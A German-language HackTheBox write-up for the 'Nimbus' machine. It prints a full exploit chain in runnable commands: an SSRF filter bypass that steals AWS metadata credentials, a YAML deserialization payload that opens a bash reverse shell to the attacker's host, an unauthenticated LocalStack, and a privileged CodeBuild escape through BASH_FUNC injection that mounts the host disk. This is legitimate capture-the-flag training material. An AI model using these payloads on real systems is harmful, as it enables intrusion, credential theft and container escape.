#  🎯 HackTheBox — Nimbus 

 **  Schwierigkeitsgrad:  **  Schwer ·  **  Betriebssystem:  **  Linux ·  **  Kategorie:  **  Cloud / Container Escape 

 !  [  Status  ](  https://img.shields.io/badge/Status-Rooted-success  ) 
 !  [  Plattform  ](  https://img.shields.io/badge/Platform-HackTheBox-red  ) 
 !  [  OS  ](  https://img.shields.io/badge/OS-Linux-blue  ) 
 !  [  Schwierigkeitsgrad  ](  https://img.shields.io/badge/Difficulty-Hard-orange  ) 

 *  Von  [  @timgad794  ](  https://github.com/timgad794  )  * 

 --- 

 ##  📋 Exploit-Kette 

 ``` 
 Aufklärung (nmap) → Web-Enumeration → SSRF (Octal-IP + ?.yaml Bypass) 
 → AWS IMDS → nimbus-web-role Credentials 
 → SQS-Enumeration → YAML-Deserialisierung (RCE) 
 → Worker-Container-Shell → Benutzer-Flag 
 → Container-Enumeration (172.18.0.2:4566) → LocalStack Admin (test/test) 
 → CodeBuild Privileged Container (privilegedMode: True) 
 → BASH_FUNC_id%% Injection (gosu-Bypass) 
 → Host-Mount via Busybox /dev/sda4 → Root-Flag 
 ``` 

 --- 

 ##  🖼️ Impressionen 

**Ziel-Webanwendung (Nimbus Job Scheduler):**
![Nimbus Home](images/01-nimbus-home.png)

**Initialer Nmap-Scan:**
![Nmap Scan](images/02-nmap.png)

---

## 🔧 Schritt 1 — Reconnaissance

### 1.1 Hosts-Eintrag

```bash
echo "10.129.143.155 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
```

### 1.2 Full-Port Nmap-Scan

```bash
mkdir -p ~/nimbus && cd ~/nimbus
nmap -p- --min-rate 5000 -T4 -oN nmap_all.txt nimbus.htb
grep -E "open" nmap_all.txt
```

**Ergebnis:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### 1.3 Service-Detection

```bash
nmap -p 22,80 -sV -sC -oN nmap_detail.txt nimbus.htb
```

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

---

## 🔧 Schritt 2 — Web-Enumeration

### 2.1 Startseite aufrufen

```bash
curl -s http://nimbus.htb/ | head -60
```

**Inhalt:** Nimbus — Internal Job Scheduler
- Hinweis auf `/jobs` (Submit Job)
- Hinweis auf `/login` (SSO deaktiviert — „migrating to Okta")
- Hinweis auf „internal Git" für YAML-Dateien
- Hinweis: **„Ping marcus on Slack"** — SSH-Key braucht DevOps-Freigabe

### 2.2 Verzeichnis-/Pfad-Fuzzing

```bash
# Kleine Wortliste, da nur wenige Pfade erwartet werden
for p in /admin /debug /console /internal /git /repos /docs /wiki \
         /api /api/v1 /api/jobs /jobs/submit /jobs/create \
         /health /metrics /status /flag /robots.txt; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://nimbus.htb$p)
  size=$(curl -s http://nimbus.htb$p | wc -c)
  echo "$code $size $p"
done
```

**Ergebnis:**
```
200 1922 /              ← Startseite
200 3453 /jobs          ← Job-Submitter (YAML/URL)
200 876  /login         ← SSO deaktiviert
200 235  /api/v1/health ← JSON-Status
404 x    alle anderen
```

### 2.3 Job-Submitter untersuchen

```bash
curl -s http://nimbus.htb/jobs
```

**Zwei Formulare:**
1. **By URL** — Fetch `.yaml` von beliebiger URL (→ SSRF-Angriffsfläche!)
2. **Paste YAML** — Direkt YAML parsen (→ YAML-Deserialisierungs-Angriffsfläche!)

Beide POSTen an `/jobs/preview`.

### 2.4 Health-Endpoint

```bash
curl -s http://nimbus.htb/api/v1/health | jq
```

```json
{
  "services": {
    "queue":     {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
    "scheduler": {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
    "storage":   {"endpoint": "http://aws.nimbus.htb", "status": "ok"}
  },
  "status": "healthy",
  "version": "1.4.2"
}
```

**Erkenntnis:** `aws.nimbus.htb` ist ein **LocalStack**-Emulator (alle AWS-Services auf einem Endpoint, Region `us-east-1`).

---

## 🔧 Schritt 3 — SSRF → AWS IMDS Credentials

### 3.1 Filter identifizieren

Test mit verschiedenen URLs gegen `/jobs/preview`:

```bash
# Test 1: Klassische interne IP
curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'
# → "Security policy: this URL targets an internal resource and has been blocked."

# Test 2: Datei-Endung fehlt
curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://10.10.16.96:8000/test'
# → "URL must point to a YAML file"
```

**Zwei Filter aktiv:**
1. **Interne-IP-Block** (String-Match auf `169.254.*`, `127.*`, `10.*` etc.)
2. **`.yaml`-Suffix-Zwang**

### 3.2 Bypass-Strategie

| Filter | Bypass |
|---|---|
| `.yaml`-Suffix | URL-**Fragment** `?.yaml` wird vom Backend ignoriert (Server sieht nur Pfad) |
| Interne-IP-Block | **Decimal-IP** — `169.254.169.254` = `2852039166` |
| Alternative | **Octal-IP** — `0251.0376.0376.0376` = `169.254.169.254` |

### 3.3 IMDS-Rollen enumerieren

```bash
curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/?.yaml'
```

**Antwort:** `nimbus-web-role`

### 3.4 Credentials exfiltrieren

```bash
curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?.yaml'
```

**Antwort (JSON im `<pre>` der HTML-Seite):**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-09-27T15:35:47Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3JpZ2luX2VjEHQa...",
  "Expiration": "2026-09-27T21:35:47Z"
}
```

### 3.5 Credentials setzen

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQa..."
export AWS_DEFAULT_REGION="us-east-1"

aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
```

```json
{
  "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```

---

## 🔧 Schritt 4 — SQS Enumeration

```bash
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

```json
{
  "QueueUrls": ["http://floci:4566/847219365028/nimbus-jobs"]
}
```

**Queue-Attribute prüfen:**

```bash
aws --endpoint-url http://aws.nimbus.htb sqs get-queue-attributes \
  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
  --attribute-names All
```

**Erkenntnis:**
- Queue ist **leer** → ein Worker konsumiert kontinuierlich
- Region `us-east-1`
- Konto `847219365028`

---

## 🔧 Schritt 5 — YAML-Deserialization RCE

### 5.1 Verwundbarkeit

Der Worker parsed SQS-Nachrichten mit **unsafe YAML-Loader**:

```python
# /app/worker.py (aus Container ausgelesen)
job = yaml.load(body, Loader=yaml.Loader)   # ⚠️ VULNERABLE
```

`yaml.Loader` erlaubt Instanziierung beliebiger Python-Objekte via `!!python/object/apply`.

### 5.2 Reverse Shell senden

**Terminal A — Listener (Ubuntu):**

```bash
nc -lvnp 4444
```

**Terminal B — Payload absenden:**

```bash
cat > /tmp/rev.py <<'PY'
import boto3

AK  = 'ASIA...'
SK  = '...'
TOK = 'IQoJb3JpZ2luX2VjEHQa...'
LHOST = '10.10.16.96'

s = boto3.Session(aws_access_key_id=AK, aws_secret_access_key=SK,
                  aws_session_token=TOK, region_name='us-east-1')
sqs = s.client('sqs', endpoint_url='http://aws.nimbus.htb')

payload = f"""!!python/object/apply:subprocess.Popen
- - bash
  - -c
  - 'bash -i >& /dev/tcp/{LHOST}/4444 0>&1'
"""

print(sqs.send_message(
    QueueUrl='http://floci:4566/847219365028/nimbus-jobs',
    MessageBody=payload)['MessageId'])
PY

python3 /tmp/rev.py
```

**Nach ~5 Sekunden** kommt im Listener:

```
Connection received on 10.129.143.155 ...
bash: cannot set terminal process group ...
worker@<container>:/app$
```

### 5.3 User-Flag

```bash
id
# uid=1000(worker) gid=1000(worker) groups=1000(worker)

cat /home/worker/user.txt
# → 🟢 <USER-FLAG>
```

---

## 🔧 Schritt 6 — Container-Enumeration

### 6.1 Grunddaten

```bash
hostname
cat /etc/hosts
cat /proc/1/cgroup
env
ls /app
cat /app/worker.py
```

**Ergebnisse:**
- Hostname: `5203dfac7130` (Container-ID)
- `/etc/hosts` zeigt `172.18.0.1 = nimbus.htb aws.nimbus.htb`
- Container läuft als `worker` (uid 1000), **keine Capabilities** (`CapEff: 0`)
- `/app/worker.py` bestätigt unsafe `yaml.load`
- Env: `QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs`

### 6.2 Container-Escape-Check (fehlgeschlagen)

```bash
# Kein Docker-Socket
ls -la /var/run/docker.sock       # No such file
# Keine Caps
cat /proc/self/status | grep Cap  # CapEff: 0000000000000000
# Kein SSH-Key
ls -la ~/.ssh                      # No such file
# Aber: Host-Platte sichtbar
ls /proc/partitions                # sda 8:0, sda1..sda4
mount | grep sda4                  # /dev/sda4 auf /etc/hosts etc.
```

**Erkenntnis:** Host-Platte `/dev/sda4` existiert, aber `mount` braucht root → wir müssen höher kommen.

### 6.3 Netzwerk-Scan aus dem Container

```bash
python3 - <<'PY'
import socket
from concurrent.futures import ThreadPoolExecutor

def scan(host, port):
    s = socket.socket(); s.settimeout(0.3)
    try:
        s.connect((host, port)); s.close(); return port
    except: return None

for host in ['172.18.0.1', '172.18.0.2']:
    print(f'=== {host} ===')
    with ThreadPoolExecutor(max_workers=500) as ex:
        for r in ex.map(lambda p: scan(host, p), range(1, 65536)):
            if r: print(f'  OPEN {host}:{r}')
PY
```

**Ergebnisse:**
```
=== 172.18.0.1 ===        ← Docker-Host
  OPEN 22
  OPEN 80
=== 172.18.0.2 ===        ← LocalStack-Container (floci)
  OPEN 4566               ← LocalStack API Gateway
  OPEN 9169               ← interne floci API
```

---

## 🔧 Schritt 7 — LocalStack Admin (keine Auth-Prüfung)

### 7.1 Vulnerabilität

LocalStack in `floci-always-free`-Edition validiert **keine SigV4-Signaturen**. Die Standard-Credentials `test` / `test` sind Formalie → **jeder Zugriff = Admin**.

### 7.2 Verifikation

```bash
curl -s http://172.18.0.2:4566/_localstack/info
# → {"original_edition":"floci-always-free","version":"1.5.17","edition":"community"}

python3 -c "
import boto3
c = dict(endpoint_url='http://floci:4566', aws_access_key_id='test',
         aws_secret_access_key='test', region_name='us-east-1')
print(boto3.client('sts', **c).get_caller_identity())
"
# → arn:aws:iam::847219365028:root
```

### 7.3 Verfügbare Services

```bash
curl -s http://172.18.0.2:4566/_localstack/health | jq '.services | keys'
```

**Relevante Services:**
`lambda`, `codebuild`, `ecs`, `eks`, `glue`, `sqs`, `s3`, `iam`,
`dynamodb`, `ec2`, `secretsmanager`, `ssm`, `logs`, `cloudformation`, …

### 7.4 Fehlversuche (Sackgassen)

| Weg | Ergebnis |
|---|---|
| Lambda mit `FileSystemConfigs` | `/mnt/efs` nicht gemountet |
| S3 Zip-Slip | `PublishLayerVersion` → 405 Not Implemented |
| ECS mit `sourcePath` | `/host` nicht gemountet |
| Glue `CreateJob` | `InvalidAction` (nur Stub) |
| EC2 `run_instances` + UserData | AMI-ID leer, kein echter Start |

**Der richtige Weg:** **CodeBuild mit `privilegedMode: True`.**

---

## 🔧 Schritt 8 — CodeBuild Privileged Container

### 8.1 Konzept

CodeBuild unterstützt **privilegierte Container**. Das gibt:
- `uid=0(root)`
- **Alle Linux Capabilities** (`CAP_SYS_ADMIN`, `CAP_MKNOD`, `CAP_DAC_OVERRIDE`, …)
- **Direkten Zugriff auf Host-Devices** (`/dev/sda*`)

### 8.2 Erstversuch — schlägt fehl

Testbuild mit `privilegedMode: True` und `id` als Command:

```bash
python3 - <<'PY'
import boto3, uuid
cb = boto3.client('codebuild', endpoint_url='http://floci:4566',
                  region_name='us-east-1',
                  aws_access_key_id='test', aws_secret_access_key='test')

spec = """version: 0.2
phases:
  build:
    commands:
      - id
      - whoami
      - cat /proc/self/status | grep -E 'Uid:|CapEff'
"""

proj = 'probe-' + uuid.uuid4().hex[:6]
cb.create_project(
    name=proj,
    source={'type': 'NO_SOURCE'},
    environment={
        'type': 'LINUX_CONTAINER',
        'image': 'floci/floci:latest',
        'computeType': 'BUILD_GENERAL1_SMALL',
        'privilegedMode': True,
    },
    serviceRole='arn:aws:iam::847219365028:role/codebuild-role',
    artifacts={'type': 'NO_ARTIFACTS'},
)
r = cb.start_build(projectName=proj, buildspecOverride=spec)
print(cb.batch_get_builds(ids=[r['build']['id']])['builds'][0]['buildStatus'])
PY
```

**Problem:** floci's Entrypoint ruft **`gosu`** auf — ein Privilege-Drop von root zu einem niedrigen User. Ohne Umgehung erhalten wir `uid=1000`, kein Mount möglich.

### 8.3 Die Lösung — BASH_FUNC Env-Injection

**Bash übergibt Funktionsdefinitionen an Kindprozesse** über Umgebungsvariablen im Format `BASH_FUNC_<name>%%`. Wir überschreiben `id`:

```
BASH_FUNC_id%% = () { echo uid=1000 gid=1000 groups=1000; }
```

Wenn `gosu` jetzt `id` aufruft, sieht es **uid=1000** und **überspringt den Privilege-Drop** → wir bleiben **root + privileged**.

### 8.4 Vollständiger Exploit

**Kali — statisches busybox bereitstellen:**

```bash
cd /tmp
wget -q https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox -O bb2
chmod +x bb2
python3 -m http.server 8080 --bind 0.0.0.0
```

**Worker-Container — Exploit-Skript:**

```bash
cat > /tmp/zz2.py <<'PYEOF'
import boto3, uuid, time

EP    = "http://floci:4566"
KALI  = "10.10.16.96"
FUNC  = "() { echo uid=1000 gid=1000 groups=1000; }"

spec = """version: 0.2
phases:
  build:
    commands:
      - id
      - whoami
      - curl -s -m 20 -o /tmp/busybox http://""" + KALI + """:8080/bb2
      - chmod +x /tmp/busybox
      - mkdir -p /mnt/host
      - /tmp/busybox mount -t ext4 /dev/sda4 /mnt/host && echo MOUNT-OK
      - /tmp/busybox ls /mnt/host
      - /tmp/busybox cat /mnt/host/root/root.txt
      - echo DONE && exit 1
"""

cb = boto3.client("codebuild", endpoint_url=EP, region_name="us-east-1",
                  aws_access_key_id="test", aws_secret_access_key="test")

proj = "esc-" + uuid.uuid4().hex[:6]
cb.create_project(
    name=proj,
    source={"type": "NO_SOURCE"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
        "environmentVariables": [{"name": "BASH_FUNC_id%%", "value": FUNC}],
    },
    serviceRole="arn:aws:iam::847219365028:role/codebuild-role",
    artifacts={"type": "NO_ARTIFACTS"},
)

r = cb.start_build(
    projectName=proj,
    buildspecOverride=spec,
    environmentVariablesOverride=[{"name": "BASH_FUNC_id%%", "value": FUNC}],
)
bid = r["build"]["id"]
print("BUILD:", bid)
for i in range(20):
    time.sleep(4)
    b = cb.batch_get_builds(ids=[bid])["builds"][0]
    st = b["buildStatus"]
    print(f"[{i*4}s] {st}")
    if st in ("SUCCEEDED", "FAILED", "FAULT", "STOPPED"):
        for p in b["phases"]:
            if p.get("contexts"):
                print("LOG:", p["contexts"][0].get("message", "")[:2500])
        break
PYEOF

python3 /tmp/zz2.py
```

### 8.5 Log-Ausgabe

```text
BUILD: esc-db20f9:1
[0s] FAILED
LOG: Exit code 1: uid=1000 gid=1000 groups=1000
root                          ← wir sind root!
MOUNT-OK                      ← /dev/sda4 gemountet
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
...
root
...
🟢 <ROOT-FLAG>                ← Root-Flag aus /mnt/host/root/root.txt
DONE
```

---

## 🏆 Ergebnis

| Flag | Status |
|---|---|
| 🟢 User | ✅ erhalten (`/home/worker/user.txt`) |
| 🔴 Root | ✅ erhalten (`/mnt/host/root/root.txt` via Host-Mount) |

---

## 📚 Kernkonzepte

| Konzept | Anwendung in Nimbus |
|---|---|
| **Decimal-IP-Bypass** | `169.254.169.254` → `2852039166` umgeht IP-Blacklist |
| **Octal-IP-Bypass** | `169.254.169.254` → `0251.0376.0376.0376` (Alternative) |
| **Fragment-Suffix-Bypass** | `?.yaml` täuscht Datei-Endungsprüfung |
| **YAML Deserialization** | `yaml.load` + `!!python/object/apply` → RCE |
| **SQS Worker Pattern** | Queue-Consumer verarbeitet Fremd-Input unsicher |
| **Unsigned LocalStack** | `test/test` mit deaktivierter SigV4-Prüfung = Admin |
| **Privileged Container** | `privilegedMode: True` → alle Caps + Host-Devices |
| **BASH_FUNC Env Injection** | Bash-Funktions-Override per `BASH_FUNC_x%%` |
| **gosu-Bypass** | Privilege-Drop durch Fake-`id`-Output umgangen |
| **Statisches busybox** | Universal-Tool wenn Ziel-Image `mount`/`python3` fehlen |

---

## 🧰 Tools & Referenzen

- [Nmap](https://nmap.org/)
- [LocalStack](https://localstack.cloud/) — AWS-Emulator
- [busybox](https://busybox.net/) — statisches Multi-Tool
- [HackTricks — AWS IMDS](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security)
- [PyYAML yaml.load Erklärung](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation)

---

## ⚠️ Disclaimer

Dieses Writeup dokumentiert ausschließlich eine autorisierte Penetration auf der HackTheBox-Plattform. Alle Credentials und Flags sind Teil der Übungsumgebung und **nicht produktiv**.

<div align="center">

**⭐ Falls dir das Writeup hilft, lass gerne einen Stern da!**

</div>
